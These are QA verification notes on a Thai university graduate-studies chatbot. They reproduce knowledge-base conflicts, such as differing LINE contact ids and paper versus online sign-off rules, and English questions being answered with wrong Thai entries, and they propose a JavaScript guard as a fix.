4. Rewrite the thesis_submit_days answer so it opens with the 21-day rule (the same counting text as gm_thesis_submission_10_deadline) and keeps the fine note as a second sentence. Or remove it and let gm_thesis_submission_10_deadline answer.
If duplicates must stay, tell decideTier or the KB-search code to prefer the gm_* entry when two entries tie. I did not read that code.
notes:
Reproduced in fresh headless Chrome (port 9736), once with ?engine=rust and once with ?engine=js, one fresh page per question, no LLM. All 8 questions gave identical output on both engines, so this is content in submissions/ui/knowledge-index.json and not a timing or engine artefact. The script is /tmp/qa/verify/F19-0/run.mjs. I also read the JSON directly.

What reproduced:
- LINE id conflict (clear, real). 'สนใจเข้าศึกษาต้องสมัครอย่างไร' answers "สอบถามเพิ่มเติม LINE ID @160ohrzm" (admission_how). 'ช่องทางติดต่องานรับนักศึกษา' (gm_admissions_office_contacts) lists "LINE @mugradmissions", dated 26 ต.ค. 2569. The id @160ohrzm appears in 3 entries and @mugradmissions in 1. A student asking both questions gets two different ids.
- Sign-off process conflict (clear, real). 'ตรวจสอบการ upload หน้าเสนอและหน้าอนุมัติอย่างไร' returns thesis_check_signoff: "...สามารถ walk in มารับต้นฉบับคืนในวัน-เวลาทำการ (จันทร์-ศุกร์)". 'ต้องส่งหน้าลงนามฉบับจริงหรือออนไลน์' returns gm_thesis_submission_14_signoff: online via e-Thesis from 17 ส.ค. 2569 "แทนการส่งเอกสารฉบับจริง". thesis_signature says the same. The walk-in entry has no date caveat. The finding named the id gm_thesis_submission_14, but the real id is gm_thesis_submission_14_signoff. The entry exists, so this is only a typo in the report.
- MAP-C pair. 'แก้ที่อยู่ MAP-C' returns transcript_general. 'เปลี่ยนที่อยู่ในหนังสือรับรองผู้เรียน MAP-C' returns suspend_general. The two bodies give the same steps (MAP-2021, Edit profile, Workplace) and each lists the other as a chip. The suspend_general id is wrong for its content. There is no factual contradiction, only a duplicate and a misleading id. This is low severity. I did not verify the "steal 8 times" count.
- thesis_submit_days. Both 'ส่งเล่มกี่วัน' and 'ต้องส่งเล่มภายในกี่วันหลังสอบผ่านครับ' return thesis_submit_days. The answer opens with "ภายใน 21 วัน", then says the late fine is counted until the e-Thesis submit, "ซึ่งต้องอยู่ในกำหนดส่งเล่มภายใน 21 วัน". So the 21-day figure is present and the answer is not wrong. It is worded about the fine and lacks the rule's start date and counting method (day 1 = exam-pass day, calendar days including holidays) and the steps. The question phrased as 'ภายในกี่วันหลังสอบผ่าน' also offers gm_thesis_submission_10_deadline as a chip. The finding overstates this one: it is a partial answer with a way forward, not a defect that misleads.

Not checked: the other competing pairs (thesis_citation, pdf/ethesis_files, turnitin, service_overview) and the 346 vs 379 programme count.

Severity: medium overall, driven by the LINE id and walk-in contradictions. They are factual conflicts on contact and process, and the app's rule is that it never gives made-up or unreliable facts. The duplicate-entry parts are low. I checked the content only, not the source pages. The imported FAQ text may genuinely be the official text, in which case the real fix is a KB-owner decision. That is not the "AI improvises" case and not the dated-snapshot design rule.

Output dir: /tmp/qa/verify/F19-1/ (run.mjs, rust.txt, js.txt). I ran all 8 repro questions plus the exact KB title, in fresh pages with ?engine=rust and again with ?engine=js. The two engines gave identical output. The data inconsistencies reproduce. The user-visible impact is mostly milder than reported, so I rate it low rather than medium.

1. Thesis days. The three phrasings 'ส่งเล่มกี่วัน', 'ต้องส่งเล่มภายในกี่วันหลังสอบผ่านครับ' and the exact title all route to thesis_submit_days. The page prepends a lead line 'ภายใน 21 วัน', so the student sees the 21-day answer first. The body below it still talks about the late-fine cut-off ('ค่าปรับส่งเล่มล่าช้าจะนับถึงวัน...') and does not give the full rule. The entry knowledge-index.json: thesis_submit_days has the title 'ส่งรูปเล่ม...ภายในกี่วัน...', but its body is about the fine. The full procedure (count from the pass day, include holidays, Abstract form, Turnitin) is only in gm_thesis_submission_10_deadline. The question does get a correct headline, so this is cosmetic.

2. MAP-C pair. 'แก้ที่อยู่ MAP-C' answered with transcript_general, and 'เปลี่ยนที่อยู่ในหนังสือรับรองผู้เรียน MAP-C' answered with suspend_general. The two entries have the same procedure in different words. suspend_general has the wrong id for its content (a 'suspend' id on a MAP-C certificate answer). Both answers are correct and equivalent, so the effect is only a different wording per phrasing. I did not count the 8 'steals' the explorer reported.

3. Admissions LINE id. 'สนใจเข้าศึกษาต้องสมัครอย่างไร' says 'LINE ID @160ohrzm'. 'ช่องทางติดต่องานรับนักศึกษา' answered from the snapshot of 26 Oct 2569 with phone and emails, and 'อ่านเพิ่มอีก 1 ข้อ'. gm_admissions_office_contacts says LINE @mugradmissions (confirmed in knowledge-index.json). So there are two different LINE ids across entries. Which one is current can't be verified from the repo.

4. Sign-off. 'ตรวจสอบการ upload หน้าเสนอและหน้าอนุมัติอย่างไร' answers from thesis_check_signoff: 'walk in มารับต้นฉบับคืน'. 'ต้องส่งหน้าลงนามฉบับจริงหรือออนไลน์' answers that submission is online-only from 17 Aug 2569, replacing the paper original. thesis_signature carries the same caveat. The two answers conflict on whether there is a paper original to collect. This is the only item a student could act on wrongly. The thesis_check_signoff answer is a verbatim FAQ import with no date caveat.

5. I did not check the other pairs (thesis_citation, pdf/ethesis_files, turnitin pairs, service_overview/welfare) or the 346 vs 379 programme count.

Not a test artefact: answers are deterministic, there is no LLM (llm=127.0.0.1:9), and a fresh page per question. Not intended design: the design rules require facts to come only from the manual, but they do not allow a manual that contradicts itself.

confirmed.title: English questions get a wrong Thai entry instead of the honest hand-off
confirmed.repro: English gold questions, fresh page each: 'How do I apply for graduate study?' | 'How can I contact the various units of the Faculty of Graduate Studies?' | 'How do I request an official letter to return to my employer?' | 'How can I collect my TOEFL ITP score report?' | 'What qualifications are required for prospective students?' | 'registration schedule first semester 2569'.
confirmed.expected: The matching entry or an honest hand-off.
confirmed.actual: Of 71 English gold questions: 35 right, 17 wrong, 6 asks, 13 honest not-found. Wrong ones show Thai entries without warning (scholarship_types, official_score, english_submit_score, admission_low_grade, admissions schedule).
confirmed.fix:
File: submissions/ui/chatbot.html, function _askCore, in the block right after decideTier produces the verdict (around lines 1495-1500, before the scope guard at ~1506). Add a Latin-only guard that works on the verdict:

  if (verdict.action === 'act' && isEnglish(q) && !_hasLatinOverlap(q, verdict.entry)) verdict = { action: 'escalate', stage: 'rethink', reason: 'English question, no English keyword overlap' };

The existing isEnglish(q) branch near line 1625 already turns an unresolved English question into the honest hand-off. A 'disambiguate' verdict for English could be treated the same way, or shown with a short English note that the manual is in Thai.

_hasLatinOverlap would tokenise the question's Latin words, drop stopwords (how, do, i, the, for, of, can, what, are), and require at least 1-2 of them to appear in the entry's title, keywords or answer text. English tokens such as TOEFL, ITP and IELTS exist in the Thai entries, so ITP-type questions would still pass.

Do this in the JS layer of _askCore, not in decide_tier. The Rust decide_tier has no access to the question text, so a Rust change would also need a golden update in benchmark/golden/decide_tier.json. A JS-side guard covers both engines.

Afterwards re-run benchmark/field/english_eval.mjs and the 71-question e2e. Check that "right" stays near 35 and "wrong" drops, to confirm the guard does not turn right answers into hand-offs. Note that "How can I collect my TOEFL ITP score report?" and the employer-letter question would still need real overlap. The letter question has no Latin tokens that match the Thai entry, so it would become a hand-off, which is honest but not an answer.
notes:
Reproduced in my own Chrome (port 9738), both ?engine=rust (default) and ?engine=js, fresh page per question, with the wait on programmes.json plus a bubble without .typing. The same results came back in two independent runs, so it is deterministic and not a timing artefact. Script: /tmp/qa/verify/F20-0/run.mjs.

Of the 6 repro questions, 5 are plainly wrong and 1 is only partly right. A Thai answer is shown with no warning, and the English hand-off is not triggered.
- "How do I apply for graduate study?" gets the scholarship entry: "ที่มา: บัณฑิตวิทยาลัยมีทุนการศึกษาอะไรบ้าง ... มี 4 ประเภท: (1) ทุนแรกเข้า ...".
- "How can I contact the various units of the Faculty of Graduate Studies?" gets the same scholarship entry.
- "How do I request an official letter to return to my employer?" gets "ขอผลคะแนนภาษาอังกฤษอย่างเป็นทางการทำอย่างไร", which says to use form บฑ.19 and email gradlc@. The correct entry, "ขอหนังสือส่งตัวกลับไปปฏิบัติงาน ณ ต้นสังกัด", only appears as a follow-up chip.
- "How can I collect my TOEFL ITP score report?" gets "ยื่นผลคะแนน TOEFL iBT / IELTS / MU ELT อย่างไร", which is about submitting iBT/IELTS scores, not collecting an ITP report. The correct entry "ขอรับผลคะแนน TOEFL ITP อย่างไร" is only a chip.
- "What qualifications are required for prospective students?" gets "คุณสมบัติหรือเกรดไม่ถึงที่หลักสูตรกำหนด ทำอย่างไร", which is the low-grade exception entry.
- "registration schedule first semester 2569" gets the generic "กำหนดการเปิด-ปิดรับสมัครเมื่อไร" (admissions schedule), not the registration schedule for first semester 2569. It does not hit the scope guard either.

Control: "What is the weather today?" gets the proper English hand-off ("I couldn't find this in the verified knowledge base..."), so the hand-off path works. The problem is that a weak Latin-only match counts as an "act".

This is partly a known limitation. docs/METHOD.md §5E and benchmark/field/results/001_2026-11-03.md already record 17/71 (24%) wrong for English school wording. The docs say English is "understood but answered in Thai" and that an honest refusal happens only when nothing matches. That does not make it intended design. The design rule says an unknown question must get an honest not-found, and a wrong confident Thai entry breaks that rule. The finding's counts (35/17/6/13) match the 001 result file (36 right, 17 wrong, 5 asked, 13 handed on), so the numbers look right. I did not re-run all 71.

Severity: medium is right. The wrong entries come with a "ที่มา" source line and no hint that the match is shaky, which is misleading. The 6 repro questions are everyday applicant questions. The failure is visible only in the Thai-language answer, which an English-only user cannot read, so they cannot tell it is wrong.

Reproduced 6 of 6 repro questions, with identical results in both engines (?engine=rust and ?engine=js). I used fresh headless Chrome on port 9739, a fresh page per question, llm and api pointed at 127.0.0.1:9, and waited for the bot bubble without .typing. Script: /tmp/qa/verify/F20-1/run.mjs.

Actual output, with the green "ตอบจากคู่มือทันที" route and no English warning:
- 'How do I apply for graduate study?' and 'How can I contact the various units of the Faculty of Graduate Studies?' both returned "ทุนการศึกษา: ... 4 ประเภท" (ที่มา: บัณฑิตวิทยาลัยมีทุนการศึกษาอะไรบ้าง).
- 'How do I request an official letter to return to my employer?' returned the official English score-report entry, "กรอกแบบฟอร์มใบคำร้องทั่วไป (บฑ.19) ... gradlc@..." (ขอผลคะแนนภาษาอังกฤษอย่างเป็นทางการทำอย่างไร).
- 'How can I collect my TOEFL ITP score report?' returned "ยื่นผลคะแนน TOEFL iBT / IELTS / MU ELT อย่างไร". It shares the TOEFL keyword but is a different question, since it is about submitting scores, not collecting a report.
- 'What qualifications are required for prospective students?' returned "คุณสมบัติหรือเกรดไม่ถึงที่หลักสูตรกำหนด" (the low-grade admission entry), which is wrong.
- 'registration schedule first semester 2569' returned "กำหนดการเปิด-ปิดรับสมัครเมื่อไร", an admissions schedule rather than a registration schedule.

Not one of the six got the English hand-off. The rest of F20's 71-question tally (35 right, 17 wrong, 6 asks, 13 not-found) I did not re-run. The counts are plausible given that every repro item fails the same way, but they are unverified.

Root cause (read from the code): search() scores with character trigrams (_jsGramSet / wasm_kb_search). Latin words such as "graduate", "study" and "apply" produce trigrams that match fragments in the Thai entries' keyword lists, and long keyword lists carry English tokens. That gives cosine of 0.20 or more, so _cosToScore returns 4 or higher. Then decideTier returns 'act' (top.s>=4 with a margin), and the not-found branch that contains the isEnglish(q) hand-off (around line 1629) is never reached. The hand-off exists but only fires when the verdict is 'escalate'. There is no Latin-specific guard.

This is not intended design. The design rule says English questions get an honest hand-off when they are not in the Thai manual. A confident wrong answer breaks the rule "an unknown question must get an honest not-found".
